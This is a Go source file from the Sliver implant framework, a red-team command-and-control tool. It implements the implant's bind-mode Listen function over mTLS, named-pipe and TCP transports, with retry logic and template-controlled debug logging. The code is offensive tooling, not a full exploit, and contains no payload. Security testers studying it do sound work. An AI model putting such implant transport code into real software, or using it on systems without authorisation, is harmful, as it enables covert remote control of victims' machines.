package transports

/*
   Sliver Implant Framework
   Copyright (C) 2019  Bishop Fox

   This program is free software: you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation, either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"net"

	// {{if .Config.TCPc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/tcp"
	// {{end}}

	// {{if .Config.MTLSc2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/mtls"
	// {{end}}

	// {{if .Config.NamePipec2Enabled}}
	"github.com/bishopfox/sliver/implant/sliver/transports/namedpipe"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// Listen - This function actually does a bit more than its name:
// it listens on a specified interface:[port] combination and blocks
// until a connection is being accepted on this listener, then returns.
func (t *Driver) Listen() (conn net.Conn, err error) {
	// {{if .Config.Debug}}
	log.Printf("Listening (bind) on %s (%s)", t.URI.Host, t.URI.Scheme)
	// {{end}}

	for t.failures < int(t.MaxErrors) {
		switch t.C2 {

		// {{if .Config.MTLSc2Enabled}}
		case sliverpb.C2_MTLS:
			// Get physical
			conn, err = mtls.Listen(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} - MTLSc2Enabled

		// {{if .Config.NamePipec2Enabled}}
		case sliverpb.C2_NamedPipe:
			conn, err = namedpipe.Listen(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} -NamePipec2Enabled

		// {{if .Config.TCPc2Enabled}}
		case sliverpb.C2_TCP:
			// Get physical
			conn, err = tcp.Listen(t.URI, t.Profile())
			if err != nil {
				// {{if .Config.Debug}}
				log.Printf("[mtls] Connection failed: %s", err)
				// {{end}}
				t.WaitOnFailure()
				continue
			}
			// {{end}} - TCPc2Enabled

		default:
			// We don't need to wait for any transport-level connection
			return nil, nil
		}

		// If the connection is set (and thus not nil), break and return
		if conn != nil {
			break
		}
	}

	// Only return an error if we have exhausted attempts
	if t.failures == int(t.MaxErrors) {
		return nil, ErrMaxAttempts
	}

	return conn, nil
}
